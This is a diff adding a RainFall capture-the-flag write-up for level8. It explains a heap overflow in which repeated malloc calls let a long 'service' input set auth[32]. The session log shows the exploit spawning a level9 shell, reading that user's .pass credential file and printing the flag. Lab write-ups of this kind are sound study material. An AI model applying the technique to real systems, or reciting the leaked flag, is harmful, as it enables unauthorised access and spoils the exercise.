@@ -1,0 +1,24 @@
+After reversing level8 I understand my goal is to pass all the conditions to call system()
+It's like the program was not finished, it asks for a password but doesn't get it.
+It allocates 4 bytes but copy all the string to auth
+
+To call system() we need to fulfill the condition that checks we entered login as a command and auth[32] != 0
+
+1) We need to enter "auth max" to get auth pointing to some memory
+2) Enter "serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (lot of char) to be sure auth[32] is set
+3) enter "login" and then get the .pass
+
+
+As ASLR is disabled all malloc() calls will return consecutive addresses
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth max
+0x804a008, (nil)
+serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
